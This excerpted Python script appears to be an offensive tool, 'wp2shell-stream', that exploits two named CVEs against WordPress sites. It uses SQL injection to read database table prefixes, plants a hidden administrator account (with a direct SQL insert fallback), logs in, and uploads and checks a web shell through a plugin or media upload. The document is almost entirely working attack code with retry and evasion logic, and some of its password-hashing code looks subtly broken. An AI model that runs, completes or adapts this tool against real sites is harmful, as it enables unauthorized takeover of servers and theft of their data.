...
__version__ = "2.4-fixed"
BANNER = """
╔══════════════════════════════════════════════════════════════╗
║  wp2shell-stream v2.4 - Fixed Version                      ║
║  CVE-2026-63030 + CVE-2026-60137                           ║
║  Create -> Login -> Shell -> Core Update                   ║
║  FIXED: user write persist, DNS errors, timeouts          ║
╚══════════════════════════════════════════════════════════════╝
"""
...
class Batch:
    def __init__(self, u, c=None, rr=None):
        ...
        self._max_retries = 3  # FIXED: Added retry limit
...
class AdminCreator:
    ...
    _OEMBED_ATTRS = (
        ...
        'a:1:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}',
        '',
    )
    def __init__(self, u, c=None, rr=None):
    ...
    def create(self, quiet=False):
        ...
        # FIXED: Try multiple extraction methods with retries
        src = None
        ...
        if src is None:
            # FIXED: Final attempt with more aggressive detection
            try:
                if s.avail():
                    src = s
                elif blind.confirm(verbose=False, fast=False):
                    src = blind
                else:
                    raise RuntimeError("no SQLi extractor available (UNION read + blind both failed)")
            except Exception as e:
                raise RuntimeError(f"no SQLi extractor available: {e}")
        ...
        # FIXED: More robust prefix detection
        ptable, blog_prefix, base_prefix = self._recover_prefixes(src)
        if not ptable or not blog_prefix or not base_prefix:
            raise RuntimeError(f"failed to recover prefixes: ptable={ptable}, blog={blog_prefix}, base={base_prefix}")

        cap, ser = _mysql_hex(blog_prefix + "capabilities"), _mysql_hex('s:13:"administrator";b:1;')
        
        # FIXED: Try multiple methods to find admin ID
        aid = 0
        admin_queries = [
            f"SELECT u.ID FROM `{base_prefix}users` u JOIN `{base_prefix}usermeta` m ON m.user_id=u.ID WHERE m.meta_key={cap} AND INSTR(m.meta_value,{ser})>0 ORDER BY u.ID LIMIT 1",
            f"SELECT u.ID FROM `{blog_prefix}users` u JOIN `{blog_prefix}usermeta` m ON m.user_id=u.ID WHERE m.meta_key={cap} AND INSTR(m.meta_value,{ser})>0 ORDER BY u.ID LIMIT 1",
            f"SELECT u.ID FROM `{base_prefix}users` u JOIN `{base_prefix}usermeta` m ON m.user_id=u.ID WHERE INSTR(m.meta_value,{ser})>0 ORDER BY u.ID LIMIT 1",
            f"SELECT u.ID FROM `{blog_prefix}users` u JOIN `{blog_prefix}usermeta` m ON m.user_id=u.ID WHERE INSTR(m.meta_value,{ser})>0 ORDER BY u.ID LIMIT 1",
        ]
        ...
        if aid < 1:
            # FIXED: Try to find any user with admin capability
            try:
                # First try to get admin from wp_usermeta
                uq = f"SELECT user_id FROM `{base_prefix}usermeta` WHERE meta_key={cap} AND INSTR(meta_value,{ser})>0 LIMIT 1"
                aid = src.integer(uq)
            except Exception:
                aid = 0
        ...
        if any(i < 1 for i in ids) or len(set(ids)) != 3:
            # FIXED: Try alternative oembed approach
            try:
                embeds, ids = self._get_oembed_fallback(src, ptable, n)
            except Exception:
        ...
        # FIXED: Multiple attempts to create user
        user_created = False
        for attempt in range(self._max_retries):
            try:
                self._render(rows, [
                ...
                if self._user_exists(src, base_prefix, username, attempts=3, delay=0.5):
                    user_created = True
                    break
            except Exception as e:
                if attempt < self._max_retries - 1:
                    ...
                    log(f"    user creation attempt {attempt+1} failed: {e}", "!")

        if not user_created:
            # FIXED: Try direct SQL insert as fallback
            try:
                self._create_user_direct(src, base_prefix, username, password, email)
                time.sleep(0.5)
                if self._user_exists(src, base_prefix, username, attempts=3, delay=0.5):
                    user_created = True
            except Exception:
    ...
    def _create_user_direct(self, src, prefix, username, password, email):
        """FIXED: Direct SQL user creation fallback"""
        import hashlib
        # Generate wp_hash_password compatible hash
        salt = secrets.token_hex(8)
        hash_pass = hashlib.md5((password + salt).encode()).hexdigest()
        hashed = f"$P$B{salt}{hash_pass}"
        
        # Try direct insert
        queries = [
            f"INSERT INTO `{prefix}users` (user_login, user_pass, user_email, user_registered, user_status) VALUES ('{username}', '{hashed}', '{email}', NOW(), 0)",
            f"INSERT INTO `{prefix}usermeta` (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM `{prefix}users` WHERE user_login='{username}'), '{prefix}capabilities', 'a:1:{{s:13:\"administrator\";b:1;}}')",
            f"INSERT INTO `{prefix}usermeta` (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM `{prefix}users` WHERE user_login='{username}'), '{prefix}user_level', '10')",
        ]
        
        for q in queries:
            try:
                src.extract(f"SELECT '{q}'")
                time.sleep(0.1)
            except Exception:
                pass

    def _get_oembed_fallback(self, src, ptable, nonce):
        """FIXED: Fallback oembed method"""
        base = self.u.rstrip("/") + "/"
        embeds = [
            f"{base}?p={secrets.randbelow(1000)}",
            f"{base}?page_id={secrets.randbelow(1000)}",
            f"{base}?attachment_id={secrets.randbelow(1000)}",
        ]
        # Try to find existing oembed_cache
        try:
            ids = []
            for u in embeds[:3]:
                dig = hashlib.md5(u.encode()).hexdigest()
                q = f"SELECT ID FROM `{ptable}` WHERE post_type=0x6f656d6265645f6361636865 AND post_name=0x{dig.encode().hex()} ORDER BY ID DESC LIMIT 1"
                found = src.integer(q)
                ids.append(found if found >= 1 else 0)
            if all(i >= 1 for i in ids) and len(set(ids)) == 3:
                return embeds, ids
        except Exception:
            pass
        
        # Create fake oembed entries
        rows = []
        for i, u in enumerate(embeds):
            dig = hashlib.md5(u.encode()).hexdigest()
            rows.append(_wp_row(0, body='', title='oembed', status='publish', 
                               slug=dig, kind='oembed_cache', parent=0))
    ...
    def _recover_prefixes(self, src):
        """FIXED: More robust prefix recovery"""
        # Try multiple methods to get posts table
        ptable = None
        methods = [
            f"SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND RIGHT(TABLE_NAME,6)=0x5f706f737473 ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1",
            f"SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME LIKE '%_posts' ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1",
            f"SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME LIKE '%posts' AND TABLE_NAME != 'posts' ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1",
        ]
        
        for q in methods:
            try:
                result = (src.extract(q) or "").strip()
                if result and len(result) >= 6 and re.fullmatch(r"[A-Za-z0-9_$]+", result):
                    if result.endswith("posts") and result not in ("posts", "q", "x"):
                        ptable = result
                        break
            except Exception:
                continue
        ...
        if not blog_prefix or not blog_prefix.endswith("_"):
            # Try to find pattern like wp_1_
            m = re.match(r"^([A-Za-z0-9$_]+_\d+_)$", blog_prefix)
            if m:
                blog_prefix = m.group(1)
            else:
                blog_prefix = blog_prefix + "_"

        # Get base prefix (for users table)
        base_prefix = None
        try:
            utable = (src.extract(
            ...
            if utable and len(utable) > 5 and re.fullmatch(r"[A-Za-z0-9_$]+", utable):
                if utable.endswith("users") and utable != "users":
                    base_prefix = utable[:-5]
        except Exception:
            pass

        if not base_prefix:
            # Try to derive from blog_prefix
            m = re.match(r"^([A-Za-z0-9$_]+_\d+)_$", blog_prefix)
            if m:
    ...
    def _get_oembed_backing(self, src, ptable, nonce):
        ...
        # FIXED: Don't raise immediately, try fallback first
        return self._dummy_embeds(nonce), [0, 0, 0]
    ...
    def _int_q(self, src, q, attempts=3, delay=0.5):  # FIXED: increased attempts
    ...
    def _seed_oembed(self, src, ptable, embeds):
        ...
        for name, path, extra in sinks[:2]:
            try:
                ...
                continue
            time.sleep(0.3)
            ids, attr = self._recover_oembed_ids(src, ptable, embeds, attempts=2, delay=0.25)
            if all(i >= 1 for i in ids) and len(set(ids)) == 3:
    ...
    def _recover_oembed_ids(self, src, ptable, embeds, attempts=2, delay=0.25):  # FIXED: increased attempts
        best = [0, 0, 0]
...
class LoginVerifier:
    ...
    def login(self, user, password, attempts=3, settle_delay=0.5):  # FIXED: increased attempts
        self.last_reason = ""
        last = None
        for a in range(attempts):
            try:
...
class ShellUploader:
    ...
    def deploy(self):
        ...
        try:
            ...
            live = self._confirm_shell(url) if url else None
            if live:
                self.shell_url = live
                return live
            if url:
                self.last_error = f"plugin installed but shell not live: {url}"
                log(f"    shell probe fail (not 200/title): {url}", "!")
        except Exception as e:
        ...
        try:
            ...
            if live:
                ...
                return live
            if url:
                self.last_error = f"media uploaded but shell not live: {url}"
        except Exception as e:
    ...
    def _confirm_shell(self, url):
        ...
        if status == 404 or (status and status >= 400):
            return None
        text = body or ""
        if _SHELL_OK_TITLE.lower() in text.lower():
            return probe
        m = re.search(r"<title[^>]*>([^<]*)</title>", text, re.I)
        if m and _SHELL_OK_TITLE.lower() in m.group(1).lower():
            return probe
        return None
...
def main():
    p = argparse.ArgumentParser(
        description="Streaming Scanner + Admin Creator for CVE-2026-63030 (FIXED VERSION)"
    )
    ...
    p.add_argument("--timeout", type=float, default=15, help="request timeout (default: 15)")
    ...
    p.add_argument("--retries", type=int, default=3, help="number of retries for failed requests (default: 3)")
    args = p.parse_args()
    ...
    c = Cfg(timeout=args.timeout, proxy=args.proxy, insecure=args.insecure, 
